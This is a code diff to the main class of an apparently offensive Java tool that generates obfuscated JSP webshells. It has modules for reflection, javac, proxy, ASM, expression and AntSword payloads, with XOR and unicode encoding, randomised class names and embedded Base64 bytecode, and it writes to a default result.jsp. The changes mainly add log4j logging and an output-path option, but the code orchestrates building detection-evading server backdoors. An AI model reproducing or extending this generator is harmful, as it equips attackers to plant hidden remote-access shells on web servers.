@@ -10,10 +10,10 @@ import com.github.javaparser.ast.body.VariableDeclarator;
 import com.github.javaparser.ast.expr.ArrayInitializerExpr;
 import com.github.javaparser.ast.expr.StringLiteralExpr;
 import com.github.javaparser.ast.type.ClassOrInterfaceType;
+import org.apache.log4j.Logger;
 import org.sec.Main;
 import org.sec.core.ByteCodeEvilDump;
 import org.sec.input.Command;
-import org.sec.input.Logo;
 import org.sec.module.IdentifyModule;
 import org.sec.module.StringModule;
 import org.sec.module.SwitchModule;
@@ -28,64 +28,80 @@ import java.util.Base64;
 import java.util.List;
 
 public class Application {
+    private static final Logger logger = Logger.getLogger(Application.class);
+
     public static void start(String[] args) {
         try {
-            Logo.PrintLogo();
-            System.out.println("Wait 1 Minute ... ");
             Command command = new Command();
             JCommander jc = JCommander.newBuilder().addObject(command).build();
             jc.parse(args);
             if (command.help) {
                 jc.usage();
+                return;
+            }
+            if (command.output == null || command.output.equals("")) {
+                command.output = "result.jsp";
             }
             if (command.jsModule) {
+                logger.info("use javascript module");
                 doJavaScript(command);
                 return;
             }
             if (command.javacModule) {
+                logger.info("use javac module");
                 doJavac(command);
                 return;
             }
             if (command.exprModule) {
+                logger.info("use expression module");
                 doExpr(command);
                 return;
             }
             if (command.proxyModule) {
+                logger.info("use proxy module");
                 doProxy(command);
                 return;
             }
             if (command.asmModule) {
+                logger.info("use asm module");
                 doAsm(command);
                 return;
             }
             if (command.antSword) {
+                logger.info("use ant sword module");
                 doAnt(command);
                 return;
             }
+            logger.info("use reflection module");
             doSimple(command);
         } catch (IOException e) {
-            e.printStackTrace();
+            logger.error(e.getMessage());
         }
     }
 
     private static void base(Command command, String method) throws IOException {
+        logger.info("read target method");
         MethodDeclaration newMethod = getMethod(method);
+        logger.info("read decrypt method");
         MethodDeclaration decMethod = getMethod("Dec.java");
         if (newMethod == null || decMethod == null) {
             return;
         }
         normalOperate(newMethod);
         decCodeOperate(decMethod);
-        WriteUtil.write(newMethod, decMethod, command.password, command.unicode);
-        System.out.println("Finish!");
+        WriteUtil.write(newMethod, decMethod, command.password, command.unicode, command.output);
+        logger.info("finish");
     }
 
     private static void doAsm(Command command) throws IOException {
+        logger.info("read asm method");
         MethodDeclaration newMethod = getMethod("Asm.java");
+        logger.info("read decrypt method");
         MethodDeclaration decMethod = getMethod("Dec.java");
         if (newMethod == null || decMethod == null) {
             return;
         }
+        logger.info("rename class name");
         List<VariableDeclarator> vds = newMethod.findAll(VariableDeclarator.class);
         for (VariableDeclarator vd : vds) {
             if (vd.getNameAsString().equals("globalArr")) {
@@ -96,24 +112,26 @@ public class Application {
         }
         normalOperate(newMethod);
         decCodeOperate(decMethod);
-        WriteUtil.write(newMethod, decMethod, command.password, command.unicode);
-        System.out.println("Finish!");
+        WriteUtil.write(newMethod, decMethod, command.password, command.unicode, command.output);
+        logger.info("finish");
     }
 
     private static void doProxy(Command command) throws IOException {
+        logger.info("read proxy method");
         MethodDeclaration proxyMethod = getMethod("Proxy.java");
+        logger.info("read decrypt method");
         MethodDeclaration decMethod = getMethod("Dec.java");
         if (proxyMethod == null || decMethod == null) {
             return;
         }
-
+        logger.info("rename class name");
         String newName = "org/sec/ByteCodeEvil" + RandomUtil.getRandomString(10);
         byte[] resultByte = ByteCodeEvilDump.dump(newName);
         if (resultByte == null || resultByte.length == 0) {
             return;
         }
         String byteCode = Base64.getEncoder().encodeToString(resultByte);
-
+        logger.info("modify global array");
         List<VariableDeclarator> vds = proxyMethod.findAll(VariableDeclarator.class);
         for (VariableDeclarator vd : vds) {
             if (vd.getNameAsString().equals("globalArr")) {
@@ -122,12 +140,10 @@ public class Application {
                 sles.get(2).setValue(newName);
             }
         }
-
         normalOperate(proxyMethod);
         decCodeOperate(decMethod);
-
-        WriteUtil.write(proxyMethod, decMethod, command.password, command.unicode);
-        System.out.println("Finish!");
+        WriteUtil.write(proxyMethod, decMethod, command.password, command.unicode, command.output);
+        logger.info("finish");
     }
 
     private static void doExpr(Command command) throws IOException {
@@ -143,24 +159,28 @@ public class Application {
     }
 
     private static void doJavac(Command command) throws IOException {
+        logger.info("read javac method");
         MethodDeclaration javacMethod = getMethod("Javac.java");
+        logger.info("read decrypt method");
         MethodDeclaration decMethod = getMethod("Dec.java");
         if (javacMethod == null || decMethod == null) {
             return;
         }
         normalOperate(javacMethod);
         decCodeOperate(decMethod);
-        WriteUtil.writeJavac(javacMethod, decMethod, command.password, command.unicode);
-        System.out.println("Finish!");
+        WriteUtil.writeJavac(javacMethod, decMethod, command.password, command.unicode, command.output);
+        logger.info("finish");
     }
 
     private static void doAnt(Command command) throws IOException {
+        logger.info("read ant sword method");
         MethodDeclaration antMethod = getMethod("Ant.java");
+        logger.info("read ant sword base64 method");
         MethodDeclaration antDecMethod = getMethod("AntBase64.java");
+        logger.info("read decrypt method");
         MethodDeclaration decMethod = getMethod("Dec.java");
         List<ClassOrInterfaceDeclaration> antClasses = getAntClass();
         String antClassName = RandomUtil.getRandomString(10);
-
         if (antMethod == null) {
             return;
         }
@@ -173,7 +193,7 @@ public class Application {
         String antCode;
         String decCode;
 
-        // Ant Class
+        logger.info("modify ant class");
         for (ClassOrInterfaceDeclaration c : antClasses) {
             if (!c.getNameAsString().equals("Ant")) {
                 c.setName(antClassName);
@@ -194,7 +214,8 @@ public class Application {
                 antClassCode = c.toString();
             }
         }
-        // Base64 Dec
+
+        logger.info("modify ant sword base64 method");
         if (decMethod == null || antDecMethod == null) {
             return;
         }
@@ -203,7 +224,7 @@ public class Application {
         XORModule.doXOR(antDecMethod);
         XORModule.doXOR(antDecMethod);
         antDecCode = antDecMethod.toString();
-        // Ant Code
+        logger.info("modify ant sword core code");
         antMethod.findAll(ClassOrInterfaceType.class).forEach(ci -> {
             if (ci.getNameAsString().equals("U")) {
                 ci.setName(antClassName);
@@ -216,12 +237,12 @@ public class Application {
             return;
         }
         antCode = antCodeTmp.substring(1, antCodeTmp.length() - 2);
-        // Dec Code
+        logger.info("modify ant sword decrypt method");
         decCodeOperate(decMethod);
         decCode = decMethod.toString();
 
-        WriteUtil.writeAnt(antClassCode, antCode, antDecCode, decCode);
-        System.out.println("Finish!");
+        WriteUtil.writeAnt(antClassCode, antCode, antDecCode, decCode, command.output);
+        logger.info("finish");
     }
 
     private static MethodDeclaration getMethod(String name) throws IOException {
